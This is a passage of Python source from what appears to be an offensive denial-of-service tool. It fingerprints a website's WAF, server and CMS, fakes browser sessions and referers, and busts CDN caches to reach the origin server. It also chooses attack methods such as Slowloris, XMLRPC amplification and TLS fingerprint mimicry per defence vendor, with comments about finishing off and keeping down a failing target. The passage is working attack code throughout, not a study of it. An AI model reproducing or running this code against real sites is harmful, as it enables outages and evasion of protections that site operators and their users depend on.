                    print(f"{bcolors.WARNING}[CHAOS] WAF re-identified from block page: {primary_waf.upper()}{bcolors.RESET}")
                    
        return detected
    
    def _chaos_harvest_cookies(self, response_headers):
        """Collect Set-Cookie headers from target responses for session persistence.
        Replaying legitimate cookies makes our requests look like returning visitors."""
        intel = self._chaos_intel
        if not response_headers:
            return
            
        cookies_raw = response_headers if isinstance(response_headers, str) else str(response_headers)
        
        import re
        cookie_matches = re.findall(r'Set-Cookie:\s*([^;]+)', cookies_raw, re.IGNORECASE)
        for cookie in cookie_matches:
            if '=' in cookie:
                key, val = cookie.split('=', 1)
                key = key.strip()
                val = val.strip()
                # Skip tracking/analytics cookies, keep session cookies
                skip_prefixes = ['_ga', '_gid', '_fbp', 'utm_']
                if not any(key.lower().startswith(p) for p in skip_prefixes):
                    intel["harvested_cookies"][key] = val
    
    def _chaos_get_cookie_header(self):
        """Build a cookie header string from harvested + cf_clearance cookies."""
        intel = self._chaos_intel
        cookies = dict(intel.get("harvested_cookies", {}))
        
        # Add cf_clearance if available
        if hasattr(self, '_cf_clearance') and self._cf_clearance:
            cookies["cf_clearance"] = self._cf_clearance
            
        if not cookies:
            return None
            
        return "; ".join(f"{k}={v}" for k, v in cookies.items())
    
    def _chaos_adaptive_rate(self):
        """Dynamically adjust attack rate based on success/block ratio.
        Smart pacing: slow down when detected, speed up when invisible."""
        intel = self._chaos_intel
        
        # Calculate recent success rate
        all_history = intel.get("success_history", {})
        recent_results = []
        for method, results in all_history.items():
            recent_results.extend(results[-10:])
            
        if len(recent_results) < 5:
            return  # Not enough data
            
        success_rate = sum(recent_results) / len(recent_results)
        
        # Adjust RPC (requests per connection)
        if success_rate > 0.85:
            # We're invisible. Increase pressure
            intel["adaptive_rpc"] = min(intel["adaptive_rpc"] + 2, 30)
            intel["jitter_ms"] = 0  # No need to slow down
            intel["successful_streak"] += 1
        elif success_rate > 0.6:
            # Moderate resistance. Stay steady
            intel["adaptive_rpc"] = max(min(intel["adaptive_rpc"], 15), 8)
            intel["jitter_ms"] = randint(10, 50)
        elif success_rate > 0.3:
            # Heavy resistance. Slow down significantly
            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 2, 5)
            intel["jitter_ms"] = randint(50, 200)
            intel["successful_streak"] = 0
        else:
            # Almost fully blocked. Minimal rate
            intel["adaptive_rpc"] = max(intel["adaptive_rpc"] - 3, 3)
            intel["jitter_ms"] = randint(200, 500)
            intel["successful_streak"] = 0
            
        # Boost temperature based on streaks
        if intel["successful_streak"] > 20:
            intel["temperature"] = min(intel["temperature"] + 0.05, 1.0)
    
    def _chaos_calculate_damage(self):
        """Estimate total damage dealt to target based on observable signals."""
        intel = self._chaos_intel
        
        score = 0
        # Requests that got through = pressure on server
        total_success = sum(sum(v) for v in intel.get("success_history", {}).values())
        score += total_success * 1
        
        # Response time increase = server struggling
        rt_baseline = intel.get("response_time_ms", 500) or 500
        hp = intel.get("health_history", [])
        if hp:
            latest_rt = hp[-1]
            if latest_rt > rt_baseline * 2:
                score += (latest_rt - rt_baseline) // 10
                
        # 5xx errors = server crashing  
        score += intel.get("consecutive_5xx", 0) * 50
        
        # Target down = maximum damage
        if intel.get("target_is_down"):
            score += 1000
            
        intel["damage_score"] = score
        return score
    
    def _chaos_simulate_session(self):
        """Simulate a realistic multi-step user session to build cookie trust.
        WAF behavioral analysis tracks user journeys. A request without prior
        navigation history is flagged as bot traffic. This builds that history."""
        intel = self._chaos_intel
        
        # Build a realistic navigation journey
        target_base = f"{self._target.scheme}://{self._target.authority}"
        journey_steps = [
            "/",                        # Step 1: User lands on homepage
            "/about", "/contact",       # Step 2: Browses informational pages
        ]
        
        # Add discovered paths for realism
        discovered = intel.get("endpoints_discovered", [])
        if discovered:
            journey_steps.extend(discovered[:3])
        
        # Add crawled paths
        if hasattr(self, 'crawled_paths') and self.crawled_paths:
            journey_steps.extend(self.crawled_paths[:5])
            
        # Execute a mini journey (3-4 steps) to build referer chain
        referer_chain = []
        try:
            import urllib.request
            for i, step in enumerate(journey_steps[:4]):
                url = f"{target_base}{step}" if step.startswith("/") else step
                headers = self._chaos_get_browser_profile()
                if referer_chain:
                    headers["Referer"] = referer_chain[-1]
                    
                req = urllib.request.Request(url, headers=headers)
                try:
                    with urllib.request.urlopen(req, timeout=4) as resp:
                        # Check cache status from response
                        cache_status = resp.headers.get('X-Cache', '').lower()
                        cf_cache = resp.headers.get('CF-Cache-Status', '').lower()
                        
                        if 'hit' in cache_status or 'hit' in cf_cache:
                            if step not in intel["cached_paths"]:
                                intel["cached_paths"].append(step)
                        else:
                            if step not in intel["uncached_paths"]:
                                intel["uncached_paths"].append(step)
                                
                        referer_chain.append(url)
                except Exception:
                    pass
                    
        except Exception:
            pass
            
        intel["referer_chain"] = referer_chain
        intel["session_journey"] = journey_steps[:4]
        
        if int(REQUESTS_SENT) < 10 and intel["uncached_paths"]:
            print(f"{bcolors.OKGREEN}[CHAOS SESSION] Cache-bypassing paths found: {intel['uncached_paths'][:5]}{bcolors.RESET}")
    
    def _chaos_get_smart_referer(self):
        """Generate a realistic Referer header from the session journey."""
        intel = self._chaos_intel
        chain = intel.get("referer_chain", [])
        
        if chain:
            return randchoice(chain)
        
        # Fallback: generate plausible referers
        target_base = f"{self._target.scheme}://{self._target.authority}"
        fake_referers = [
            target_base + "/",
            f"https://www.google.com/search?q={self._target.authority}",
            f"https://www.google.com/",
            target_base + "/about",
            f"https://www.bing.com/search?q={self._target.authority}",
        ]
        return randchoice(fake_referers)
    
    def _chaos_get_smart_content_type(self):
        """Rotate POST content types to evade content-type-specific WAF rules."""
        intel = self._chaos_intel
        intel["content_type_rotation"] += 1
        rotation = intel["content_type_rotation"] % 5
        
        content_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data; boundary=----WebKitFormBoundary" + ProxyTools.Random.rand_str(16),
            "text/plain",
            "application/json; charset=utf-8",
        ]
        return content_types[rotation]
    
    def _chaos_get_cache_busting_path(self):
        """Select path that bypasses CDN cache for maximum origin server impact."""
        intel = self._chaos_intel
        uncached = intel.get("uncached_paths", [])
        
        if uncached:
            # Prefer uncached paths - these hit the origin server directly
            return randchoice(uncached)
        
        # Fallback: generate cache-busting query strings
        base_path = self.get_random_target_path()
        sep = "&" if "?" in base_path else "?"
        # These parameters force CDN cache miss
        busters = [
            f"{sep}_={int(time())}",
            f"{sep}nocache={ProxyTools.Random.rand_str(8)}",
            f"{sep}cb={randint(100000, 999999)}",
            f"{sep}v={ProxyTools.Random.rand_str(6)}&t={int(time())}",
        ]
        return base_path + randchoice(busters)

    def _chaos_retry_escalate(self, failed_method_name, method_map):
        """If method A fails, try a stronger/different variant automatically."""
        # Escalation chains: method -> fallback method
        escalation = {
            "GET": "DYN",           # Static GET failed -> Dynamic path GET
            "POST": "POST_DYN",     # Static POST -> Dynamic payload POST
            "STRESS": "SLOW_V2",    # Noisy stress blocked -> Go low and slow
            "PPS": "DYN",           # Raw packets blocked -> Dynamic headers
            "DYN": "STEALTH_JA3",   # Dynamic blocked -> Full TLS mimicry
            "POST_DYN": "STEALTH_JA3",
            "BOT": "STEALTH_JA3",
            "COOKIE": "STEALTH_JA3",
            "STEALTH_JA3": "SLOW_V2",  # Even stealth blocked -> Slowloris
            "SLOW_V2": "COOKIE",       # Slowloris blocked -> Cookie flood
        }
        fallback = escalation.get(failed_method_name)
        if fallback and fallback in method_map:
            try:
                method_map[fallback]()
                return True
            except Exception:
                pass
        return False

    def _chaos_health_pulse(self):
        """Periodic health check: re-probe target to detect weakening or death."""
        intel = self._chaos_intel
        now = time()
        
        # Only check every 30 seconds
        if now - intel.get("last_health_check", 0) < 30:
            return
        intel["last_health_check"] = now
        
        try:
            import urllib.request
            target_url = f"{self._target.scheme}://{self._target.authority}/"
            t_start = time()
            req = urllib.request.Request(target_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
            })
            with urllib.request.urlopen(req, timeout=8) as resp:
                latency = int((time() - t_start) * 1000)
                status = resp.status
                
                intel["health_history"].append(latency)
                if len(intel["health_history"]) > 20:
                    intel["health_history"] = intel["health_history"][-20:]
                
                # Analyze trend: is target getting weaker?
                if len(intel["health_history"]) >= 3:
                    recent_avg = sum(intel["health_history"][-3:]) / 3
                    baseline = intel.get("response_time_ms", 500) or 500
                    
                    if recent_avg > baseline * 3:
                        intel["target_getting_weaker"] = True
                        intel["target_is_down"] = False
                    elif recent_avg > baseline * 1.5:
                        intel["target_getting_weaker"] = True
                        intel["target_is_down"] = False
                    else:
                        intel["target_getting_weaker"] = False
                        intel["target_is_down"] = False
                        
                if status >= 500:
                    intel["consecutive_5xx"] += 1
                    
        except Exception:
            # Target didn't respond = it's down or blocking us
            intel["health_history"].append(9999)
            if len(intel["health_history"]) >= 3:
                last_3 = intel["health_history"][-3:]
                if all(t >= 9999 for t in last_3):
                    intel["target_is_down"] = True
                    intel["target_getting_weaker"] = True
    
    def _chaos_detect_waf_adaptation(self):
        """Detect if the WAF is learning our attack patterns and adapting."""
        intel = self._chaos_intel
        now = time()
        
        # Track blocks per 60-second window
        if now - intel.get("last_block_window_time", 0) >= 60:
            current_blocks = intel["consecutive_block"]
            intel["blocks_per_minute"].append(current_blocks)
            if len(intel["blocks_per_minute"]) > 10:
                intel["blocks_per_minute"] = intel["blocks_per_minute"][-10:]
            intel["last_block_window_time"] = now
            intel["consecutive_block"] = 0
            
            # If block rate is INCREASING over time, WAF is adapting
            bpm = intel["blocks_per_minute"]
            if len(bpm) >= 3:
                trend_old = sum(bpm[:len(bpm)//2]) / max(len(bpm)//2, 1)
                trend_new = sum(bpm[len(bpm)//2:]) / max(len(bpm) - len(bpm)//2, 1)
                
                if trend_new > trend_old * 1.5 and trend_new > 2:
                    intel["waf_adapting"] = True
                else:
                    intel["waf_adapting"] = False
    
    def _chaos_decoy(self):
        """Inject legitimate-looking traffic to camouflage attack patterns.
        Uses full browser profile + referer chain for maximum authenticity."""
        try:
            s = self.open_connection()
            profile = self._chaos_get_browser_profile()
            decoy_paths = ["/", "/robots.txt", "/favicon.ico", "/sitemap.xml", "/about", "/contact"]
            path = randchoice(decoy_paths)
            referer = self._chaos_get_smart_referer()
            
            payload = (f"GET {path} HTTP/1.1\r\n"
                       f"Host: {self._target.authority}\r\n"
                       f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
                       f"Accept: {profile.get('Accept', 'text/html,*/*')}\r\n"
                       f"Accept-Language: {profile.get('Accept-Language', 'en-US,en;q=0.9')}\r\n"
                       f"Accept-Encoding: {profile.get('Accept-Encoding', 'gzip, deflate, br')}\r\n"
                       f"Referer: {referer}\r\n"
                       f"Connection: keep-alive\r\n"
                       f"\r\n").encode("utf-8")
            Tools.send(s, payload)
            Tools.safe_close(s)
        except Exception:
            pass

    def _chaos_recon(self):
        """Phase 1: Deep Multi-Probe Reconnaissance."""
        intel = self._chaos_intel
        if intel["recon_done"]:
            return
            
        intel["recon_done"] = True
        target_url = f"{self._target.scheme}://{self._target.authority}/"
        
        # --- PROBE 1: Main page fingerprint ---
        try:
            import urllib.request
            t_start = time()
            req = urllib.request.Request(target_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
            })
            with urllib.request.urlopen(req, timeout=10) as resp:
                intel["response_time_ms"] = int((time() - t_start) * 1000)
                headers_raw = str(resp.headers).lower()
                body = resp.read(16384).decode('utf-8', errors='ignore').lower()
                server_hdr = resp.headers.get('Server', '').lower()
                powered_by = resp.headers.get('X-Powered-By', '').lower()
                
                # --- Detect Server Type ---
                if 'nginx' in server_hdr: intel["server_type"] = "nginx"
                elif 'apache' in server_hdr: intel["server_type"] = "apache"
                elif 'litespeed' in server_hdr: intel["server_type"] = "litespeed"
                elif 'microsoft' in server_hdr or 'iis' in server_hdr: intel["server_type"] = "iis"
                elif 'cloudflare' in server_hdr: intel["server_type"] = "cloudflare"
                elif 'openresty' in server_hdr: intel["server_type"] = "openresty"
                else: intel["server_type"] = "unknown"
                
                # --- Detect WAF Type (expanded) ---
                all_signals = headers_raw + body
                if 'cloudflare' in headers_raw or 'cf-ray' in headers_raw or 'cf-cache-status' in headers_raw:
                    intel["waf_type"] = "cloudflare"
                elif 'akamai' in headers_raw or 'akamaighost' in server_hdr or 'x-akamai' in headers_raw:
                    intel["waf_type"] = "akamai"
                elif 'sucuri' in all_signals or 'x-sucuri' in headers_raw or 'sucuri-cache' in headers_raw:
                    intel["waf_type"] = "sucuri"
                elif 'imperva' in all_signals or 'incapsula' in all_signals or 'visid_incap' in all_signals:
                    intel["waf_type"] = "imperva"
                elif 'ddos-guard' in all_signals or 'ddosguard' in server_hdr:
                    intel["waf_type"] = "ddosguard"
                elif 'fastly' in headers_raw or 'x-fastly' in headers_raw:
                    intel["waf_type"] = "fastly"
                elif 'stackpath' in all_signals or 'securitypolicyviolation' in all_signals:
                    intel["waf_type"] = "stackpath"
                elif 'wordfence' in all_signals or 'wfwaf' in all_signals:
                    intel["waf_type"] = "wordfence"
                elif 'mod_security' in all_signals or 'modsecurity' in all_signals:
                    intel["waf_type"] = "modsec"
                elif 'aws' in headers_raw or 'awselb' in headers_raw or 'x-amz' in headers_raw:
                    intel["waf_type"] = "aws_waf"
                else:
                    intel["waf_type"] = "none"
                    
                # --- Detect CMS Type (expanded) ---
                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body or 'wp-includes' in body:
                    intel["cms_type"] = "wordpress"
                elif 'joomla' in body or '/media/system/js' in body:
                    intel["cms_type"] = "joomla"
                elif 'drupal' in body or 'sites/default' in body or 'drupal.js' in body:
                    intel["cms_type"] = "drupal"
                elif 'shopify' in body or 'cdn.shopify' in body:
                    intel["cms_type"] = "shopify"
                elif 'laravel' in powered_by or 'x-csrf-token' in body:
                    intel["cms_type"] = "laravel"
                elif 'next' in powered_by or '__next' in body:
                    intel["cms_type"] = "nextjs"
                else:
                    intel["cms_type"] = "custom"
                    
                # --- Detect Captcha ---
                captcha_signals = ['captcha', 'recaptcha', 'turnstile', 'hcaptcha', 'challenge-platform', 'g-recaptcha']
                if any(sig in all_signals for sig in captcha_signals):
                    intel["has_captcha"] = True
                    
                # --- Detect Rate Limiting ---
                if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw or 'x-rate-limit' in headers_raw:
                    intel["has_rate_limit"] = True
                    
        except Exception:
            intel["waf_type"] = "unknown_heavy"
            intel["server_type"] = "unknown"
            intel["cms_type"] = "custom"
            intel["has_captcha"] = True
            intel["response_time_ms"] = 9999
            
        # --- PROBE 2: Discover heavy endpoints silently ---
        heavy_probes = ['/wp-login.php', '/xmlrpc.php', '/wp-admin/admin-ajax.php',
                        '/?s=test', '/search?q=test', '/api/', '/graphql', '/rest/']
        discovered = []
        for probe_path in heavy_probes:
            try:
                probe_url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
                req2 = urllib.request.Request(probe_url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
                })
                with urllib.request.urlopen(req2, timeout=4) as resp2:
                    if resp2.status < 404:
                        discovered.append(probe_path)
            except Exception:
                pass
        intel["endpoints_discovered"] = discovered
        
        # Upgrade CMS detection from endpoint probes
        if '/xmlrpc.php' in discovered or '/wp-login.php' in discovered:
            intel["cms_type"] = "wordpress"
            
        # Log full intelligence report
        if int(REQUESTS_SENT) < 10:
            latency_color = bcolors.OKGREEN if intel["response_time_ms"] < 500 else bcolors.WARNING if intel["response_time_ms"] < 2000 else bcolors.FAIL
            print(f"")
            print(f"{bcolors.OKCYAN}[CHAOS V12 RECON REPORT]{bcolors.RESET}")
            print(f"  WAF Detected  : {bcolors.WARNING}{intel['waf_type'].upper()}{bcolors.RESET}")
            print(f"  Server Engine : {intel['server_type']}")
            print(f"  CMS Platform  : {bcolors.OKBLUE}{intel['cms_type'].upper()}{bcolors.RESET}")
            print(f"  Response Time : {latency_color}{intel['response_time_ms']}ms{bcolors.RESET}")
            print(f"  Captcha Active: {'YES' if intel['has_captcha'] else 'NO'}")
            print(f"  Rate Limiting : {'YES' if intel['has_rate_limit'] else 'NO'}")
            print(f"  Heavy Endpoints: {discovered if discovered else 'None found'}")
            print(f"")
    
    def _chaos_plan(self):
        """Phase 2: Strategic Planning with phase transitions and deep adaptation."""
        intel = self._chaos_intel
        intel["total_executions"] += 1
        tick = intel["total_executions"]
        
        # === PHASE TRANSITIONS (Military Doctrine) ===
        # PROBE(0-20) -> CALIBRATE(20-80) -> ASSAULT(80-300) -> SUSTAIN(300+)
        if tick <= 20:
            intel["phase"] = "PROBE"      # Test all methods equally
        elif tick <= 80:
            intel["phase"] = "CALIBRATE"  # Start favoring what works
        elif tick <= 300:
            intel["phase"] = "ASSAULT"    # Full power on best methods
        else:
            intel["phase"] = "SUSTAIN"    # Maintain pressure, conserve resources
            
        # Check if target is dying (consecutive 5xx = server overload)
        if intel["consecutive_5xx"] >= 5:
            intel["phase"] = "FINISH"     # Target is crumbling, finish it
            
        phase = intel["phase"]
        
        # === BASE WEIGHTS ===
        weights = {
            "GET": 10, "POST": 10, "STRESS": 5, "PPS": 5,
            "DYN": 10, "POST_DYN": 15, "SLOW_V2": 0,
            "STEALTH_JA3": 0, "XMLRPC_AMP": 0, "WP_SEARCH": 0,
            "BOT": 0, "COOKIE": 0,
        }
        
        # === STRATEGY A: WAF-Specific Counter-Tactics ===
        waf = intel.get("waf_type", "none")
        
        waf_profiles = {
            "cloudflare":    {"STEALTH_JA3": 70, "SLOW_V2": 30, "POST_DYN": 25, "BOT": 15, "STRESS": 0, "PPS": 0},
            "akamai":        {"STEALTH_JA3": 80, "SLOW_V2": 25, "POST_DYN": 20, "GET": 5, "STRESS": 0, "PPS": 0},
            "imperva":       {"STEALTH_JA3": 60, "COOKIE": 30, "POST_DYN": 25, "SLOW_V2": 20, "DYN": 20},
            "sucuri":        {"STEALTH_JA3": 50, "POST_DYN": 30, "DYN": 25, "BOT": 20},
            "modsec":        {"POST_DYN": 35, "DYN": 30, "COOKIE": 20, "STEALTH_JA3": 40, "STRESS": 0},
            "wordfence":     {"POST_DYN": 40, "DYN": 30, "WP_SEARCH": 50, "XMLRPC_AMP": 45, "STEALTH_JA3": 30},
            "ddosguard":     {"STEALTH_JA3": 75, "SLOW_V2": 35, "POST_DYN": 20, "STRESS": 0, "PPS": 0},
            "fastly":        {"STEALTH_JA3": 65, "POST_DYN": 30, "DYN": 25, "SLOW_V2": 20},
            "stackpath":     {"STEALTH_JA3": 60, "SLOW_V2": 30, "POST_DYN": 25, "DYN": 20},
            "aws_waf":       {"STEALTH_JA3": 70, "POST_DYN": 30, "DYN": 25, "COOKIE": 15, "STRESS": 0},
            "unknown_heavy": {"STEALTH_JA3": 80, "SLOW_V2": 40, "POST_DYN": 15, "GET": 5, "STRESS": 0, "PPS": 0},
        }
        
        if waf in waf_profiles:
            for k, v in waf_profiles[waf].items():
                weights[k] = v
        else:
            # No WAF, full aggression
            weights.update({"STRESS": 30, "PPS": 25, "GET": 25, "POST": 25, "POST_DYN": 30})
            
        # === STRATEGY B: CMS-Specific Exploitation ===
        cms = intel.get("cms_type", "custom")
        cms_boosts = {
            "wordpress": {"XMLRPC_AMP": 65, "WP_SEARCH": 75},
            "joomla":    {"DYN": 40, "POST_DYN": 40},
            "drupal":    {"DYN": 35, "POST_DYN": 35, "POST": 30},
            "shopify":   {"STEALTH_JA3": 60, "SLOW_V2": 35},
            "laravel":   {"POST_DYN": 45, "DYN": 35, "POST": 30},
            "nextjs":    {"POST_DYN": 35, "DYN": 30},
        }
        if cms in cms_boosts:
            for k, v in cms_boosts[cms].items():
                weights[k] = max(weights.get(k, 0), v)
                
        # === STRATEGY C: Endpoint-Aware Targeting ===
        discovered = intel.get("endpoints_discovered", [])
        if '/xmlrpc.php' in discovered:
            weights["XMLRPC_AMP"] = max(weights.get("XMLRPC_AMP", 0), 70)
        if '/graphql' in discovered or '/api/' in discovered:
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["POST"] = max(weights.get("POST", 0), 30)
            
        # === STRATEGY D: Real-Time Battlefield Adaptation ===
        proxy_burn_ratio = 0
        if hasattr(self, '_proxies') and self._proxies:
            proxy_burn_ratio = len(BURNED_PROXIES) / max(len(self._proxies), 1)
            
        if IS_RECYCLING or proxy_burn_ratio > 0.4:
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 70)
            weights["STRESS"] = 0
            weights["PPS"] = 0
            weights["GET"] = max(weights["GET"] // 2, 1)
        elif proxy_burn_ratio < 0.05 and phase != "PROBE":
            weights["STRESS"] = max(weights.get("STRESS", 0), 20)
            weights["PPS"] = max(weights.get("PPS", 0), 15)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 30)
        
        # === STRATEGY E: Response Time Intelligence ===
        rt = intel.get("response_time_ms", 0)
        if rt > 3000:
            # Target is already slow. It's weak. Hammer it harder
            weights["STRESS"] = max(weights.get("STRESS", 0), 25)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 35)
        elif rt < 100:
            # Target is behind CDN cache. Need to bypass cache
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 30)
            weights["DYN"] = max(weights.get("DYN", 0), 25)
            weights["GET"] = max(weights["GET"] // 2, 2)  # Cached GETs do nothing
        
        # === STRATEGY F: Phase-Based Modifiers ===
        if phase == "PROBE":
            # Equal opportunity: test everything
            for k in weights:
                if weights[k] > 0:
                    weights[k] = max(weights[k], 10)
                    
        elif phase == "CALIBRATE":
            # Start rewarding winners
            best = intel.get("best_method")
            if best and best in weights:
                weights[best] = int(weights[best] * 1.5)
                
        elif phase == "ASSAULT":
            # Maximum aggression on proven methods
            best = intel.get("best_method")
            worst = intel.get("worst_method")
            if best and best in weights:
                weights[best] = int(weights[best] * 2.0)
            if worst and worst in weights:
                weights[worst] = max(weights[worst] // 3, 1)
                
        elif phase == "FINISH":
            # Target is dying. All-in with heavy methods
            weights["STRESS"] = max(weights.get("STRESS", 0), 40)
            weights["PPS"] = max(weights.get("PPS", 0), 30)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["GET"] = max(weights.get("GET", 0), 25)
            
        elif phase == "SUSTAIN":
            # Long-duration: mix stealth to avoid getting cut
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 30)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 20)
        
        # === STRATEGY G: Reinforcement Learning with Sliding Window ===
        history = intel.get("success_history", {})
        for method_name, results in history.items():
            if method_name not in weights:
                continue
            recent = results[-20:]  # Last 20 results only (sliding window)
            if not recent:
                continue
            success_rate = sum(recent) / len(recent)
            
            if success_rate > 0.8:
                weights[method_name] = int(weights[method_name] * 1.5)
            elif success_rate > 0.5:
                weights[method_name] = int(weights[method_name] * 1.2)
            elif success_rate < 0.2:
                weights[method_name] = max(int(weights[method_name] * 0.3), 1)
            elif success_rate < 0.4:
                weights[method_name] = max(int(weights[method_name] * 0.6), 1)
                
            # Track best and worst performers
            if not intel["best_method"] or success_rate > history.get(intel["best_method"], [0])[-1:][0] if history.get(intel["best_method"]) else 0:
                intel["best_method"] = method_name
            if not intel["worst_method"] or (success_rate < 0.3 and len(recent) > 5):
                intel["worst_method"] = method_name
        
        # === STRATEGY H: Experience Database Lookup ===
        # Check if we have pre-coded knowledge for this exact target profile
        server = intel.get("server_type", "unknown")
        experience_key = (waf, server, cms)
        if experience_key in self._EXPERIENCE_DB:
            exp_bonuses = self._EXPERIENCE_DB[experience_key]
            for method_name, bonus in exp_bonuses.items():
                weights[method_name] = max(weights.get(method_name, 0), bonus)
            if int(REQUESTS_SENT) < 10:
                print(f"{bcolors.OKGREEN}[CHAOS] Experience match found: {experience_key} -> Applying veteran tactics{bcolors.RESET}")
        else:
            # Try partial matches (waf, *, cms) or (*, server, cms)
            for exp_key, exp_bonuses in self._EXPERIENCE_DB.items():
                if exp_key[0] == waf and exp_key[2] == cms:
                    for method_name, bonus in exp_bonuses.items():
                        weights[method_name] = max(weights.get(method_name, 0), int(bonus * 0.7))
                    break
                    
        # === STRATEGY I: Anti-Pattern Detection ===
        # If WAF is catching our pattern (3+ consecutive blocks), trigger emergency evasion
        if intel["consecutive_block"] >= 3:
            intel["emergency_evasion"] = True
            # Force a completely different method from last 3
            last_3 = intel.get("last_3_methods", [])
            for method_name in last_3:
                if method_name in weights:
                    weights[method_name] = 1  # Nearly zero out recently used methods
            # Boost unused methods
            for method_name in weights:
                if method_name not in last_3 and weights[method_name] > 0:
                    weights[method_name] = int(weights[method_name] * 1.5)
        else:
            intel["emergency_evasion"] = False
            
        # === STRATEGY J: Combo Chain Selection ===
        # Every 10-15 executions, plan a coordinated combo instead of random picks
        if not intel.get("combo_queue") and intel["total_executions"] % randint(10, 15) == 0:
            # Select the best combo chain based on current intel
            if cms == "wordpress":
                intel["combo_queue"] = list(self._COMBO_CHAINS["wp_annihilator" if '/xmlrpc.php' in discovered else "db_destroyer"])
            elif waf in ("cloudflare", "akamai", "ddosguard", "fastly"):
                intel["combo_queue"] = list(self._COMBO_CHAINS["stealth_burst"])
            elif waf in ("imperva",):
                intel["combo_queue"] = list(self._COMBO_CHAINS["cookie_monster"])
            elif waf == "none" and phase == "ASSAULT":
                intel["combo_queue"] = list(self._COMBO_CHAINS["blitz_krieg"])
            elif phase == "SUSTAIN":
                intel["combo_queue"] = list(self._COMBO_CHAINS["slow_siege"])
            else:
                intel["combo_queue"] = list(self._COMBO_CHAINS["polymorphic_wave"])
                
        # === STRATEGY K: Efficiency Scoring ===
        # Boost methods with best success/attempt ratios
        for method_name, history_list in intel.get("success_history", {}).items():
            if method_name in weights and len(history_list) >= 10:
                recent = history_list[-20:]
                efficiency = sum(recent) / len(recent)
                intel["efficiency_score"][method_name] = efficiency
                
                # Find the weakpoint (highest efficiency method with high weight)
                if efficiency > 0.8 and weights.get(method_name, 0) > 20:
                    intel["target_weakpoint"] = method_name
        
        # === STRATEGY L: WAF Counter-Intelligence ===
        # If WAF is adapting to us, radically shift the entire strategy
        if intel.get("waf_adapting"):
            # Scramble everything: swap high and low weights
            sorted_methods = sorted(weights.items(), key=lambda x: -x[1])
            if len(sorted_methods) >= 4:
                # Boost the bottom methods, suppress the top ones
                for i, (method, w) in enumerate(sorted_methods):
                    if i < 3:  # Top 3 most used
                        weights[method] = max(w // 4, 1)
                    elif i >= len(sorted_methods) - 3:  # Bottom 3 least used
                        weights[method] = max(w * 3, 20)
                        
        # === STRATEGY M: Target Health Exploitation ===
        if intel.get("target_getting_weaker"):
            # Target is weakening! Escalate pressure with heavy methods
            weights["STRESS"] = max(weights.get("STRESS", 0), 35)
            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
            weights["PPS"] = max(weights.get("PPS", 0), 25)
            
        if intel.get("target_is_down"):
            # Target is DOWN! Switch to sustain mode to keep it down
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
            weights["GET"] = max(weights.get("GET", 0), 20)
            # Reduce heavy methods to conserve resources
            weights["STRESS"] = max(weights.get("STRESS", 0) // 2, 5)
            weights["PPS"] = max(weights.get("PPS", 0) // 2, 5)
            
        # === STRATEGY O: Temperature-Based Aggression ===
        temp = intel.get("temperature", 0.5)
        if temp > 0.7:
            # HOT: Boost aggressive methods
            for m in ["STRESS", "PPS", "POST_DYN", "XMLRPC_AMP", "WP_SEARCH"]:
                if m in weights and weights[m] > 0:
                    weights[m] = int(weights[m] * (1 + temp))
        elif temp < 0.35:
            # COLD: Boost stealth methods
            for m in ["STEALTH_JA3", "SLOW_V2", "BOT", "COOKIE"]:
                if m in weights:
                    weights[m] = max(weights.get(m, 0), int(30 / max(temp, 0.1)))
            for m in ["STRESS", "PPS"]:
                if m in weights:
                    weights[m] = max(int(weights[m] * temp), 1)
                    
        # === STRATEGY P: Wave State Modifiers ===
        wave = intel.get("wave_state", "RISE")
        if wave == "PEAK":
            # Maximum firepower
            for m in weights:
                if weights[m] > 10:
                    weights[m] = int(weights[m] * 1.4)
        elif wave == "REST":
            # Minimal footprint, only decoys and stealth
            for m in weights:
                if m not in ("STEALTH_JA3", "SLOW_V2", "BOT"):
                    weights[m] = max(weights[m] // 3, 1)
        elif wave == "FALL":
            # Gradual reduction
            for m in weights:
                if m not in ("STEALTH_JA3", "SLOW_V2"):
                    weights[m] = max(int(weights[m] * 0.7), 1)
        
        # === STRATEGY S: WAF Rule-Specific Counter-Tactics ===
        rules = intel.get("waf_rules_triggered", [])
        if "rate_limited" in rules or "rate_limit" in rules or "1015" in str(rules):
            # WAF is rate limiting. Maximum stealth, minimum volume
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 80)
            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
            weights["STRESS"] = 0
            weights["PPS"] = 0
        if "js_challenge" in rules or "browser_check" in rules:
            # JS challenge active. Only TLS-mimicking methods work
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 90)
            weights["GET"] = 1
            weights["POST"] = 1
        if "captcha_required" in rules:
            # Captcha active. Need cf_clearance + stealth
            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 85)
            weights["BOT"] = max(weights.get("BOT", 0), 20)
